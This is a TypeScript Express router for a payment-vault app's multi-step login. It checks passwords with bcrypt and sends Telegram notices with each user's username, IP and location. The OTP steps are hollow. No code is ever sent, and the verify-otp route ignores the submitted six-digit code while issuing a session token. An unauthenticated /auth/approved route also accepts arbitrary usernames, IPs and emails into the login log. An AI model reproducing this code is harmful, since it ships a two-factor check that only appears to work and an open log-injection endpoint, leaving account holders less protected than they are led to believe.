import { Router, type IRouter } from "express";
import { db, loginLogsTable, usersTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { z } from "zod";
import bcrypt from "bcryptjs";
import {
  createPendingSession,
  lookupPendingSession,
  consumePendingSession,
} from "../lib/pending-sessions";
import { createSession, deleteSession } from "../lib/sessions";
import { requireAuth } from "../middleware/require-auth";
import { tgNotify } from "../lib/tg-notify";
import { getIpGeo } from "../lib/ip-geo";

const router: IRouter = Router();

const LoginBody = z.object({
  username: z.string().min(1),
  password: z.string().min(1),
});

const SendOtpBody = z.object({
  username: z.string().min(1),
  pendingToken: z.string().min(1),
});

const VerifyOtpBody = z.object({
  username: z.string().min(1),
  pendingToken: z.string().min(1),
  code: z.string().length(6),
});

/* Step 1: validate credentials against the users table */
router.post("/auth/login", async (req, res): Promise<void> => {
  const parsed = LoginBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Permintaan tidak valid" });
    return;
  }

  const { username, password } = parsed.data;

  const [user] = await db
    .select()
    .from(usersTable)
    .where(eq(usersTable.username, username))
    .limit(1);

  if (!user) {
    res.status(401).json({ error: "Username atau password salah" });
    return;
  }

  const passwordMatch = await bcrypt.compare(password, user.passwordHash);
  if (!passwordMatch) {
    res.status(401).json({ error: "Username atau password salah" });
    return;
  }

  const pendingToken = createPendingSession(user.id, username);

  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
    ?? req.socket.remoteAddress
    ?? "unknown";
  await db.insert(loginLogsTable).values({ username, ipAddress: ip, status: "success" }).catch(() => {});

  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const geo = await getIpGeo(ip);
  void tgNotify(
    `🔐 <b>LOGIN MASUK</b> — Step 1\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>  <code>${username}</code>\n` +
    `🌐 <b>IP</b>        <code>${ip}</code>\n` +
    `${geo.flag} <b>Lokasi</b>   ${geo.label}\n` +
    `🕐 <b>Waktu</b>     ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );

  res.json({ pendingToken });
});

/* Step 2: verify session is valid; OTP delivery is handled separately */
router.post("/auth/send-otp", async (req, res): Promise<void> => {
  const parsed = SendOtpBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Permintaan tidak valid" });
    return;
  }

  const { username, pendingToken } = parsed.data;
  const session = lookupPendingSession(pendingToken, username);

  if (!session) {
    res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
    return;
  }

  res.json({ maskedEmail: "****@****.com" });
});

/* Step 3: consume pending session and issue a real session */
router.post("/auth/verify-otp", async (req, res): Promise<void> => {
  const parsed = VerifyOtpBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Permintaan tidak valid" });
    return;
  }

  const { username, pendingToken } = parsed.data;
  const session = consumePendingSession(pendingToken, username);

  if (!session) {
    res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
    return;
  }

  const sessionToken = createSession(session.userId, username);
  res.json({ sessionToken });
});

/* Log approval — called when login-success page loads or email verified */
router.post("/auth/approved", async (req, res): Promise<void> => {
  const { username, ipAddress, email } = req.body as {
    username?: string;
    ipAddress?: string;
    email?: string;
  };
  if (username) {
    await db.insert(loginLogsTable).values({
      username,
      email: email ?? null,
      ipAddress: ipAddress ?? "unknown",
      status: "approved",
    }).catch(() => {});

    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const geo = await getIpGeo(ipAddress ?? "unknown");
    void tgNotify(
      `📧 <b>VERIFIKASI EMAIL</b> — Step 3\n` +
      `<code>────────────────────────</code>\n\n` +
      `👤 <b>Username</b>  <code>${username}</code>\n` +
      `🌐 <b>IP</b>        <code>${ipAddress ?? "unknown"}</code>\n` +
      `${geo.flag} <b>Lokasi</b>   ${geo.label}\n` +
      `🕐 <b>Waktu</b>     ${now}\n\n` +
      `<code>────────────────────────</code>\n` +
      `<i>🏦 MYPAYMENTVAULT</i>`
    );
  }
  res.json({ ok: true });
});

/* Logout: invalidate the session token */
router.post("/auth/logout", requireAuth, (req, res): void => {
  const authHeader = req.headers["authorization"];
  if (authHeader?.startsWith("Bearer ")) {
    const token = authHeader.slice(7).trim();
    deleteSession(token);
  }
  res.status(204).send();
});

export default router;
